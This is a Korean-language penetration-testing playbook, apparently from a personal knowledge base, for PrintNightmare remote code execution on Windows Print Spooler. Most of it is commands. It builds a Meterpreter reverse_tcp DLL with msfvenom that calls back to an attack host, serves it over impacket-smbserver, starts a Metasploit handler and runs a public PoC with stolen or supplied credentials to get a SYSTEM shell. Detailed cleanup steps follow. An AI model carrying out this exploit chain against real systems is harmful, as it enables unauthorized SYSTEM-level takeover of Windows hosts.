---
tags:
  - 환경/windows
시작조건: ["Windows Print Spooler RPC 접근 가능", "PrintNightmare 영향 조건 확인"]
필요권한: ["원격 Print Spooler RPC 호출 권한"]
필요조건: ["PoC가 요구하는 Windows credential", "영향받는 Print Spooler", "호환되는 PoC와 Impacket 버전", "SMB payload 경로", "callback listener", "대상 printer driver와 payload 복사 경로를 확인·정리할 관리자 경로"]
결과: ["SYSTEM 세션", "원격 코드 실행"]
---

# PrintNightmare 원격 코드 실행

## 한 줄 판단

공격 호스트에서 대상 Windows의 SMB와 Print Spooler 원격 프로시저 호출 인터페이스에 연결할 수 있고 PoC에 필요한 Windows 계정이 있다면, 패치 상태를 확인한 뒤 원격 DLL 로드와 대상 호스트의 SYSTEM 코드 실행을 단계별로 검증한다.

> Print Spooler 중단, driver·DLL 잔존, printer job 손실 또는 재부팅이 발생할 수 있다. 대상의 exact driver와 복사된 DLL을 다시 식별할 수 없으면 전체 복구 완료로 표시하지 않는다.

## 전제 조건

| 구분 | 조건 | 확인 방법 |
|---|---|---|
| 시작 상태 | 대상 RPC와 SMB 도달성 | `rpcdump.py`와 payload 공유 접근 확인 |
| 필요 권한 | PoC가 요구하는 Windows 인증 | 대상에 대한 인증 성공 확인 |
| 입력·환경 | 영향받는 build·patch와 호환 PoC | 패치 상태, PoC README, Impacket 버전 고정 |
| 복구 경로 | 대상의 printer driver·Spooler와 copied DLL을 확인할 별도 관리자 경로 | 아래 기준선 명령과 재접속 가능성 확인 |

## 실행

### 1. Print RPC 노출 확인

```bash
rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'
```

확인할 출력:

- `[MS-RPRN]` 또는 `[MS-PAR]`.
- 이 출력은 프로토콜 노출이며 취약성 증거가 아니다.

### 2. 대상의 driver·Spooler 기준선 확인

실행할 정확한 PoC source에서 `pName`, driver environment와 payload 복사 경로 생성 방식을 먼저 확인한다. 이 문서가 검토한 cube0x0 Python PoC는 driver 이름 `1234`, `Windows x64`와 `%SystemRoot%\System32\spool\drivers\x64\3\old\<N>\<PAYLOAD_FILE_NAME>` 후보를 사용하지만 fork·버전마다 같다고 가정하지 않는다. 아래 `<POC_DRIVER_NAME>`은 실제 source에서 확인한 값이다.

대상 관리자 PowerShell에서 작업 전 Spooler와 driver, 같은 이름의 payload 파일을 기록한다. 같은 driver 이름이나 payload 경로가 이미 있으면 덮어쓰지 않고 PoC 실행을 중단한다.

```powershell
Get-Service Spooler | Select-Object Name,Status,StartType
Get-PrinterDriver | Select-Object Name,PrinterEnvironment,InfPath,ConfigFile,DataFile
Get-PrinterDriver -Name '<POC_DRIVER_NAME>' -ErrorAction SilentlyContinue
$DriverRoot = Join-Path $env:SystemRoot 'System32\spool\drivers\x64\3'
Get-ChildItem -LiteralPath $DriverRoot -Recurse -File -Filter '<PAYLOAD_FILE_NAME>' -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime
```

Spooler가 작업 전 `Running`이고 `<POC_DRIVER_NAME>`과 같은 payload 파일이 없으며, exploit 뒤 이 관리자 경로로 다시 접속할 수 있을 때만 진행한다. 목록을 확보하지 못하면 callback 성공 뒤 원격 흔적을 구분할 수 없으므로 복구 가능한 대표 절차의 전제가 충족되지 않은 것이다.

### 3. DLL과 전송 경로 준비

Linux 공격 호스트에서 기존 445/TCP listener와 고유 run directory 부재를 확인한다. DLL·SMB share는 이 directory 안에만 둔다.

```bash
sudo ss -ltnp 'sport = :445'
test ! -e '<PRINTNIGHTMARE_RUN_DIRECTORY>'
mkdir -m 700 -- '<PRINTNIGHTMARE_RUN_DIRECTORY>'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_HOST> LPORT=<LISTEN_PORT> -f dll -o '<PRINTNIGHTMARE_RUN_DIRECTORY>/<PAYLOAD_FILE_NAME>'
sudo impacket-smbserver <SHARE> '<PRINTNIGHTMARE_RUN_DIRECTORY>' -smb2support
```

SMB server는 전용 terminal에서 전경으로 유지한다. 다른 Linux terminal에서 `sudo ss -ltnp 'sport = :445'`로 실제 `<SMB_SERVER_PID>`와 command line을 기록한다.

동일한 payload와 주소·포트로 [[metasploit]]의 `exploit/multi/handler`를 background job으로 시작하고, 기존 목록에 없던 `<HANDLER_JOB_ID>`를 기록한다.

```text
msf6 > sessions -l
msf6 > jobs -l
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <ATTACK_HOST>
msf6 exploit(multi/handler) > set LPORT <LISTEN_PORT>
msf6 exploit(multi/handler) > run -j
msf6 > jobs -l
```

### 4. PoC 실행

```bash
sudo python3 CVE-2021-1675.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '\\<ATTACK_HOST>\<SHARE>\<PAYLOAD_FILE_NAME>'
```

확인할 출력:

- `Bind OK`, `pDriverPath Found`, `Executing ... payload.dll`.
- listener에 새 `<SESSION_ID>`가 열리고 대상에서 `whoami`가 `nt authority\system`.
- callback 뒤 대상 관리자 PowerShell에서 `<POC_DRIVER_NAME>`과 작업 전 없던 `<PAYLOAD_FILE_NAME>`의 exact 복사 경로를 `<COPIED_PAYLOAD_PATH>`로 기록한다. PoC retry 때문에 한 경로보다 많을 수 있다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `MS-RPRN`·`MS-PAR`만 확인 | Print RPC 노출 | 취약성 미확정 | patch·정책·PoC 호환성 확인 |
| `Bind OK`와 DLL 실행 시도 | RPC 호출과 원격 경로 처리 진행 | 코드 실행 미확정 | SMB 요청과 listener callback 확인 |
| callback 세션과 `nt authority\system` | SYSTEM 원격 코드 실행 성공 | 고권한 세션 확보 | 원복 후 [[고권한 세션 확보 후 후속 판단]] |
| DLL 요청은 있으나 callback 없음 | payload 실행 차단 또는 egress 문제 | 실행 영향 미확정 | AV·아키텍처·주소·포트·egress 분리 |
| Spooler 응답 중단 | 서비스 영향 발생 가능 | 복구 필요 상태 | 추가 실행 중단 후 기준 상태에 맞춰 서비스 복구 |

## 확인할 출력과 권한

- RPC endpoint, PoC `Bind OK`, DLL fetch, callback, `whoami`를 단계별로 구분한다.
- SYSTEM 셸이 실제 대상 호스트에서 열린 경우에만 권한 상승 성공으로 판정한다.

## 변경 영향과 복구

PoC는 `RpcAddPrinterDriverEx`로 driver entry를 추가하고 UNC DLL을 spool driver tree에 복사할 수 있다. 연결이 살아 있을 때 대상 자원을 먼저 정리하고, session·handler와 SMB server, 공격 호스트 파일 순으로 종료한다.

### 1. 대상 driver와 copied DLL 정리

대상 관리자 PowerShell에서 작업 전 없던 exact driver만 제거한다. `Remove-PrinterDriver`에 wildcard나 `-RemoveFromDriverStore`를 사용하지 않는다. 이 PoC는 기존 Windows driver package의 `UNIDRV.DLL`을 참조할 수 있으므로 driver store 전체를 제거하면 정상 printer 구성까지 손상할 수 있다.

```powershell
$CreatedDriver = Get-PrinterDriver -Name '<POC_DRIVER_NAME>' -ErrorAction SilentlyContinue
$CreatedDriver | Select-Object Name,PrinterEnvironment,InfPath,ConfigFile,DataFile
if ($null -ne $CreatedDriver) { Remove-PrinterDriver -Name '<POC_DRIVER_NAME>' -Confirm:$false }
Get-PrinterDriver -Name '<POC_DRIVER_NAME>' -ErrorAction SilentlyContinue
Remove-Item -LiteralPath '<COPIED_PAYLOAD_PATH>' -Force
Test-Path -LiteralPath '<COPIED_PAYLOAD_PATH>'
Get-Service Spooler | Select-Object Name,Status,StartType
```

driver 조회가 비고 각 exact payload path의 `Test-Path`가 `False`여야 한다. 작업 전 목록에 없던 exact copied DLL path만 제거한다. 여러 retry path가 있으면 확인된 각 `<COPIED_PAYLOAD_PATH>`에 같은 검증을 반복한다. driver가 사용 중이거나 path를 확정할 수 없으면 이름 패턴으로 driver·`old` directory를 일괄 삭제하지 않고 `원격 복구 미확인`으로 남긴다.

Spooler가 중단됐다면 작업 전 `Running`이었을 때만 `Start-Service Spooler`를 실행하고 다시 상태를 확인한다. crash·재부팅·printer job 손실과 Windows event/보안 로그는 원상복구할 수 없는 영향이며 driver·DLL 제거와 별도로 기록한다.

### 2. session·listener와 공격 호스트 파일 정리

후속 원격 정리가 끝난 뒤 msfconsole에서 이번 session과 handler job만 종료한다.

```text
msf6 > sessions -l
msf6 > sessions -k <SESSION_ID>
msf6 > sessions -l
msf6 > jobs -l
msf6 > jobs -k <HANDLER_JOB_ID>
msf6 > jobs -l
```

`multi/handler`가 session 생성 뒤 이미 종료되어 `<HANDLER_JOB_ID>`가 `jobs -l`에 없으면 `jobs -k`는 실행하지 않는다. 기존 job은 종료하지 않는다.

SMB server 전경 terminal에서 `Ctrl+C`를 입력하고 다른 Linux terminal에서 기록한 PID와 445/TCP를 확인한다. 남아 있을 때만 command line이 일치하는 exact PID를 종료한다.

```bash
ps -p <SMB_SERVER_PID> -o pid=,args=
sudo ss -ltnp 'sport = :445'
sudo kill <SMB_SERVER_PID>
ps -p <SMB_SERVER_PID> -o pid=,args=
sudo ss -ltnp 'sport = :445'
rm -- '<PRINTNIGHTMARE_RUN_DIRECTORY>/<PAYLOAD_FILE_NAME>'
rmdir -- '<PRINTNIGHTMARE_RUN_DIRECTORY>'
test ! -e '<PRINTNIGHTMARE_RUN_DIRECTORY>'
```

`Ctrl+C`로 PID가 이미 끝났다면 `kill`은 실행하지 않는다. 기존 session·job·445 listener를 일괄 종료하지 않는다. 다음을 모두 확인해야 이번 작업 자원 정리가 완료다.

| 변경 대상 | 완료 확인 |
|---|---|
| 대상 driver와 copied DLL | `<POC_DRIVER_NAME>` 부재, 확인한 모든 `<COPIED_PAYLOAD_PATH>` 부재 |
| 대상 Spooler | 작업 전 status·start type과 일치. crash·job 손실은 별도 영향으로 남김 |
| Meterpreter session·handler | 기록한 `<SESSION_ID>`·`<HANDLER_JOB_ID>`가 목록에 없음 |
| SMB server·공격 호스트 DLL | 기록한 PID와 이번 445 listener가 없고 고유 run directory가 없음 |

원격 연결이 먼저 끊겨 driver·copied DLL·Spooler를 확인하지 못하면 local listener와 파일만 정리할 수 있으며 전체 복구 완료로 표시하지 않는다.

## 관련 도구

- [[msfvenom]]
- [[impacket-smbserver]]
- [[metasploit]]
- [[meterpreter]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft: CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [Microsoft: Get-PrinterDriver](https://learn.microsoft.com/powershell/module/printmanagement/get-printerdriver)
- [Microsoft: Remove-PrinterDriver](https://learn.microsoft.com/powershell/module/printmanagement/remove-printerdriver)
- [cube0x0: CVE-2021-1675 Python PoC](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)
